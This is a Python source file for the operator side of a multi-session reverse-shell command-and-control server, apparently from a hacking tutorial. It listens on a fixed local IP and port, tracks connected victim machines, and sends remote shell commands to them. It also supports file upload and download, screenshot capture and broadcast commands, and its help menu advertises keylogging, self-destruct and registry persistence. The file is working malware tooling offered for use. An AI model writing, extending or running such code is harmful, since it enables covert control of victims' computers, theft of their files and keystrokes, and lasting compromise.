import socket
import subprocess
import threading

import termcolor
import json
import os


def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send((jsondata.encode()))


def reliable_recv(target):  # take any amount iof data
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()  # all data decoded without newline chars etc
            return json.loads(data)
        except ValueError:
            continue


def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())  # not using recv function coz we r read


def download_file(target, file_name):
    f = open(file_name, 'wb')  # write bytes
    target.settimeout(1)  # to define where is the end
    chunk = target.recv(1024)
    while chunk:  # not null
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:  # this is why settimeout line otherwise it try infinite to receive 1024 bytes
            break
    target.settimeout(None)  # so latter dont interfere other cmds with socket object
    f.close()


def target_communication(target, ip):
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))  # kali like interface to show ip addy-%s
        reliable_send(target, command)
        if command == 'quit':
            sock.close()
            break
        elif command == 'background':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d.png' % (count), 'wb')  # write bytes
            target.settimeout(3)  # to define where is the end
            chunk = target.recv(1024)
            while chunk:  # not null
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:  # this is why set-timeout line otherwise it try infinite to receive 1024 bytes
                    break
            target.settimeout(None)  # so latter dont interfere other cmds with socket object
            f.close()
            count += 1



        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                --> Quit session with the target
            clear                               --> Clear screen
            cd *Directory name*                 --> Changes directory on target system
            upload *File name*                  --> Upload file to the target system
            download *File name*                --> Download file from Target system
            keylog_start                        --> Start Keylogger
            keylog_dump                         --> Print Keystrokes that target inputted
            keylog_stop                         --> Stop and self destruct the keylogger file
            persistence *RegName* *FileName*    -->Create Persistence in registry'''), 'green')
        else:
            result = reliable_recv(target)
            print(result)


def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(termcolor.colored(str(ip) + ' has connected!', 'green'))
        except:
            pass


targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.26.128', 5555))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
print(termcolor.colored('[+]Waiting for incomming connections ...', 'blue'))

while True:
    command = input("[**] Command & Control Centre: ")
    if command == 'targets':
        counter = 0  # session id
        for ip in ips:
            print('Session ' + str(counter) + '...' + str(ip))  # print session with id
            counter += 1
    elif command == 'clear':
        os.system('clear')
    elif command[:7] == 'session':  # communicate with a particular session
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            target_communication(tarnum, tarip)
        except:
            print('[+] No session Under that id number')
    elif command == 'exit':
        for target in targets:
            reliable_send(target, 'quit')
            target.close()
        sock.close()
        stop_flag = True
        t1.join()
        break
    elif command[:4] == 'kill':
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        reliable_send(targ, 'quit')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)
    elif command[:7] == 'sendall':
        x = len(targets)
        print(x)
        i = 0
        try:
            while i < x:
                tarnumber = targets[i]
                print(tarnumber)
                reliable_send(tarnumber, command)
                i += 1
        except:
            print(termcolor.colored('Failed!', 'red'))
    else:
        print(termcolor.colored("Command doesnt exist!", 'red'))
